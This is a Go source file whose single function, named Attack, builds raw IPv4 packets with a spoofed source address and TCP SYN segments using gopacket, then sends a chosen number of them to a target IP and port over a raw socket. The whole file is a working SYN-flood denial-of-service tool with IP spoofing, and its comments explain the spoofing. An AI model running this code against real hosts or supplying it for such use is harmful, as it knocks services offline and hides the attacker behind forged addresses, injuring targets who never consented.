package main

import (
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func Attack(src string, dstn string, packets int, port int) {
	// we're going to use gopacket to create custom IP packet headers with a spoofed IP and a simple SYN segment on the transport layer with the TCP protocol

	ipHeader := &layers.IPv4{
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    net.ParseIP(src),
		DstIP:    net.ParseIP(dstn),
	}

	tcpHeader := &layers.TCP{
		DstPort: layers.TCPPort(port),
		SYN:     true,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
	}
	tcpHeader.SetNetworkLayerForChecksum(ipHeader)

	err := gopacket.SerializeLayers(buf, opts, ipHeader, tcpHeader)
	if err != nil {
		fmt.Println("Error: ", err)
	}

	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		fmt.Println("Socket couldn't be created. Error: ", err)
	}

	dstnAddr := net.IPAddr{
		IP: net.ParseIP(dstn),
	}

	countError := 0

	for i := 0; i <= packets; i++ {
		// the WriteTo method for IPConn returns an int n per docs https://pkg.go.dev/net#IPConn https://pkg.go.dev/net#PacketConn
		// it's not clear to me what this int is for, however doesn't seem like we'll need it

		_, err := conn.WriteTo(buf.Bytes(), &dstnAddr)
		if err != nil {
			fmt.Println("Couldn't send packet: Error: ", err)
			countError += 1
			if countError > 6 {
				fmt.Println("Too many errors, no more attempts will be made")
			}
			continue
		}
	}
	conn.Close()

}
